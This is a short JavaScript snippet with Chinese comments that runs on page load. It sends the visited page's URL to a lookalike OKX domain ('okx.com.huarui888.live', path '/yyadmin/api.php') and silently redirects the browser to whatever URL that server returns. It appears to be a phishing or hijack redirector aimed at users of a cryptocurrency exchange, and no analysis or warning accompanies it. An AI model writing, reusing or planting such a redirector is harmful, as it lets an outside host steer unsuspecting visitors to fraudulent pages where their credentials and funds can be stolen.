var api_url = 'https://www.okx.com.huarui888.live';
var domain = window.location.href;
var xhr = new XMLHttpRequest();
// 发起 GET 请求
xhr.open('GET', api_url + '/yyadmin/api.php?zhu_url=' + domain, true);
// 监听请求状态变化
xhr.onreadystatechange = function() {
    if (xhr.readyState === 4 && xhr.status === 200) {
        try {
            // 解析返回的 JSON 数据
            var response = JSON.parse(xhr.responseText);

            // 检查服务器返回的状态码是否为成功
            if (response.code === 1) {
                console.log(response);
                // 获取 data 中的跳转 URL
                var redirectUrl = response.data;
                // 检查 redirectUrl 是否有效
                if (redirectUrl) {
                    // 执行跳转到新域名
                     window.location.replace(redirectUrl);
                   //window.location.href = redirectUrl;
                } else {
                    console.error('跳转 URL 不存在');
                }
            } else {
                console.error('API 返回错误：', response.message);
            }
        } catch (error) {
            console.error('解析 JSON 时发生错误：', error);
        }
    } else if (xhr.readyState === 4 && xhr.status !== 200) {
        console.error('请求失败，状态码：' + xhr.status);
    }
};

// 发送请求
xhr.send();
